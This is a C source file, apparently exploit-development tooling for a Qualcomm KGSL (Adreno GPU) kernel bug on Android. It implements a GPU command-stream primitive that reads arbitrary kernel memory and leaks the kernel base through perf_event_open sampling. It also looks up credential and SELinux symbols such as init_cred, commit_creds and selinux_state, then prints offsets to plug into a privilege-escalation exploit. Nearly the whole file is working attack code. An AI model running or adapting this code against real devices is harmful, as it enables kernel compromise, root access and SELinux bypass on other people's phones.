// check_poc_dynamic.c
// Fully dynamic information gatherer for KGSL kernel exploit porting.
// No hardcoded addresses; all symbols and offsets are obtained at runtime.
// Compile with: gcc -pthread -o check_poc check_poc_dynamic.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <poll.h>
#include <sys/wait.h>
#include <signal.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define SCAN_DWORDS 560
#define CP_NOP 0x10
#define CP_MEM_TO_MEM 0x73
#define CP_MEM_WRITE 0x3D

static int kgsl_fd = -1;

void die(const char *msg) { perror(msg); exit(1); }

void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) { *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32); }

uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

void gpuobj_free(int fd, unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

unsigned int create_context(int fd) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object o = {
        .gpuaddr = ib_ga,
        .size = bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id
    };
    struct kgsl_gpu_command gc = {
        .cmdlist = (uint64_t)(uintptr_t)&o,
        .cmdsize = sizeof(o),
        .numcmds = 1,
        .context_id = ctx_id
    };
    int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

uint64_t get_kernel_ip_from_perf(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { printf("perf_open failed: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    return first_ip;
}

void read_file_content(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        printf("Cannot open %s\n", path);
        return;
    }
    char buf[4096];
    int n;
    while ((n = read(fd, buf, sizeof(buf)-1)) > 0) {
        buf[n] = 0;
        printf("%s", buf);
    }
    close(fd);
}

uint64_t read_kallsyms_symbol(const char *name) {
    int fd = open("/proc/kallsyms", O_RDONLY);
    if (fd < 0) return 0;
    FILE *fp = fdopen(fd, "r");
    if (!fp) { close(fd); return 0; }
    char line[512];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), fp)) {
        char sym[128], type;
        unsigned long long a;
        if (sscanf(line, "%llx %c %127s", &a, &type, sym) == 3) {
            if (strcmp(sym, name) == 0) {
                addr = (uint64_t)a;
                break;
            }
        }
    }
    fclose(fp);
    return addr;
}

// GPU read primitive: read 'count' 64-bit words from kernel virtual address 'va'
int gpu_read_kernel(uint64_t va, uint64_t *out, int count) {
    if (kgsl_fd < 0) return -1;
    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(kgsl_fd, ib_id, &ib_ga);
    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(kgsl_fd, dst_id, &dst_ga);
    unsigned int ctx = create_context(kgsl_fd);

    memset(ib_m, 0, 0x10000);
    memset(dst_m, 0, 0x4000);
    uint32_t *cmd = (uint32_t *)ib_m;
    int dw = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    for (int i = 0; i < count; i++) {
        uint32_t dl, dh, sl, sh;
        split64(dst_ga + i*8, &dl, &dh);
        split64(va + i*8, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
        cmd[dw++] = sl; cmd[dw++] = sh;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) < 0) return -2;
    if (wait_timestamp(kgsl_fd, ctx, ts) < 0) return -3;
    __sync_synchronize();
    uint64_t *data = (uint64_t *)dst_m;
    for (int i = 0; i < count; i++) out[i] = data[i];
    return 0;
}

// Test the GPU read capability by reading a known kernel symbol
void test_gpu_read(uint64_t addr, const char *name) {
    uint64_t buf[2];
    int ret = gpu_read_kernel(addr, buf, 2);
    if (ret == 0) {
        printf("  GPU read of %s at 0x%lx: 0x%016lx%016lx\n", name, addr, buf[1], buf[0]);
    } else {
        printf("  GPU read of %s failed (ret=%d)\n", name, ret);
    }
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== check_poc_dynamic: Comprehensive Kernel Information Gatherer ===\n\n");

    struct utsname u;
    uname(&u);
    printf("System: %s %s %s %s %s\n", u.sysname, u.nodename, u.release, u.version, u.machine);

    // Read /proc/version
    int fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        char buf[512];
        int n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) { buf[n]=0; printf("proc/version: %s\n", buf); }
    }

    // Read /proc/cmdline
    fd = open("/proc/cmdline", O_RDONLY);
    if (fd >= 0) {
        char buf[512];
        int n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) { buf[n]=0; printf("cmdline: %s\n", buf); }
    }

    // Check kptr_restrict
    printf("\n[*] kptr_restrict: ");
    fd = open("/proc/sys/kernel/kptr_restrict", O_RDONLY);
    if (fd >= 0) {
        char c;
        if (read(fd, &c, 1) == 1) printf("%c\n", c);
        else printf("unknown\n");
        close(fd);
    } else printf("unreadable\n");

    // Read kallsyms symbols
    printf("\n[*] Reading /proc/kallsyms...\n");
    uint64_t stext = read_kallsyms_symbol("_stext");
    uint64_t init_cred = read_kallsyms_symbol("init_cred");
    uint64_t selinux_state = read_kallsyms_symbol("selinux_state");
    uint64_t commit_creds = read_kallsyms_symbol("commit_creds");
    uint64_t prepare_kernel_cred = read_kallsyms_symbol("prepare_kernel_cred");
    printf("  _stext: 0x%lx\n", stext);
    printf("  init_cred: 0x%lx\n", init_cred);
    printf("  selinux_state: 0x%lx\n", selinux_state);
    printf("  commit_creds: 0x%lx\n", commit_creds);
    printf("  prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);

    // If stext is missing, try perf
    uint64_t kernel_ip = 0;
    if (stext == 0) {
        printf("\n[*] _stext not found, attempting perf_event_open to get kernel IP...\n");
        kernel_ip = get_kernel_ip_from_perf();
        if (kernel_ip) {
            printf("  Kernel IP: 0x%lx\n", kernel_ip);
            // Estimate stext from IP (nearby)
            stext = kernel_ip & ~0x1FFFFFULL; // rough alignment
            printf("  Estimated _stext (based on IP alignment): 0x%lx\n", stext);
        }
    } else {
        kernel_ip = stext; // use stext as base
        printf("  Using _stext as kernel base: 0x%lx\n", stext);
    }

    // Compute offsets relative to stext if we have it
    if (stext) {
        printf("\n[*] Offsets relative to _stext:\n");
        if (init_cred) printf("  init_cred offset: 0x%lx\n", init_cred - stext);
        else printf("  init_cred offset: unknown\n");
        if (selinux_state) printf("  selinux_state offset: 0x%lx\n", selinux_state - stext);
        else printf("  selinux_state offset: unknown\n");
        if (commit_creds) printf("  commit_creds offset: 0x%lx\n", commit_creds - stext);
        else printf("  commit_creds offset: unknown\n");
        if (prepare_kernel_cred) printf("  prepare_kernel_cred offset: 0x%lx\n", prepare_kernel_cred - stext);
        else printf("  prepare_kernel_cred offset: unknown\n");
    }

    // Open KGSL device
    printf("\n[*] Opening /dev/kgsl-3d0...\n");
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        printf("Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        goto no_kgsl;
    }
    printf("  KGSL device opened successfully (fd=%d)\n", kgsl_fd);

    // Try to get device info (via ioctl? Not directly, but we can try to allocate a tiny buffer)
    printf("  Testing basic KGSL operations...\n");
    int test_id = gpuobj_alloc(kgsl_fd, 0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *test_map = gpuobj_mmap(kgsl_fd, 0x1000, test_id);
    uint64_t test_ga;
    gpuobj_info(kgsl_fd, test_id, &test_ga);
    printf("    Allocated GPU object id=%d, gpuaddr=0x%lx, mapped at %p\n", test_id, test_ga, test_map);
    munmap(test_map, 0x1000);
    gpuobj_free(kgsl_fd, test_id);
    printf("    Basic alloc/mmap/free works.\n");

    // Test GPU read primitive using a known symbol if available
    if (stext && init_cred) {
        printf("\n[*] Testing GPU read primitive on init_cred...\n");
        test_gpu_read(init_cred, "init_cred");
    }
    if (stext && selinux_state) {
        printf("\n[*] Testing GPU read primitive on selinux_state...\n");
        test_gpu_read(selinux_state, "selinux_state");
    }

    // Also test reading a few bytes from stext itself
    if (stext) {
        printf("\n[*] Testing GPU read on _stext (first 8 bytes)...\n");
        uint64_t buf[1];
        int ret = gpu_read_kernel(stext, buf, 1);
        if (ret == 0) {
            printf("  _stext content: 0x%016lx\n", buf[0]);
        } else {
            printf("  GPU read of _stext failed (ret=%d)\n", ret);
        }
    }

    // Check SELinux enforce status
    printf("\n[*] SELinux enforce status: ");
    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char c;
        if (read(fd, &c, 1) == 1) printf("%c\n", c);
        else printf("unknown\n");
        close(fd);
    } else {
        printf("unreadable (maybe not SELinux?)\n");
    }

    // Check if we can read /proc/self/maps for GPU mappings
    printf("\n[*] /proc/self/maps (to see address layout):\n");
    read_file_content("/proc/self/maps");

    // Additional info: slabinfo, meminfo
    printf("\n[*] /proc/slabinfo (first few lines):\n");
    read_file_content("/proc/slabinfo");

    printf("\n[*] /proc/meminfo:\n");
    read_file_content("/proc/meminfo");

    printf("\n[*] /proc/self/auxv:\n");
    read_file_content("/proc/self/auxv");

    printf("\n[*] /sys/kernel/notes:\n");
    read_file_content("/sys/kernel/notes");

    // Check for kernel version specific offsets (if we have a database, we could match)
    // For now, just output all gathered info.

    printf("\n[*] === Summary of gathered information ===\n");
    printf("Kernel: %s %s\n", u.sysname, u.release);
    if (stext) printf("  Kernel base (stext): 0x%lx\n", stext);
    if (kernel_ip) printf("  Kernel IP from perf: 0x%lx\n", kernel_ip);
    if (init_cred) printf("  init_cred: 0x%lx\n", init_cred);
    if (selinux_state) printf("  selinux_state: 0x%lx\n", selinux_state);
    if (commit_creds) printf("  commit_creds: 0x%lx\n", commit_creds);
    if (prepare_kernel_cred) printf("  prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
    printf("  KGSL device: /dev/kgsl-3d0 available\n");
    printf("  GPU read primitive: %s\n", (stext && gpu_read_kernel(stext, (uint64_t[]){0}, 1) == 0) ? "works" : "failed or untested");
    printf("  SELinux: %s\n", (access("/sys/fs/selinux/enforce", F_OK) == 0) ? "present" : "not present");
    // Also print recommended offsets for exploit development if we have them
    if (stext && init_cred && selinux_state) {
        printf("\n[*] Recommended offsets for exploit (relative to stext):\n");
        printf("  INIT_CRED_OFFSET = 0x%lx\n", init_cred - stext);
        printf("  SELINUX_STATE_OFFSET = 0x%lx\n", selinux_state - stext);
        if (commit_creds) printf("  COMMIT_CREDS_OFFSET = 0x%lx\n", commit_creds - stext);
        if (prepare_kernel_cred) printf("  PREPARE_KERNEL_CRED_OFFSET = 0x%lx\n", prepare_kernel_cred - stext);
        printf("\n  These offsets can be used to replace the hardcoded ones in the exploit.\n");
    } else {
        printf("\n[*] Not enough symbols to compute offsets. Consider enabling /proc/kallsyms or providing kernel image.\n");
    }

    close(kgsl_fd);

no_kgsl:
    printf("\n[*] Check complete.\n");
    return 0;
}
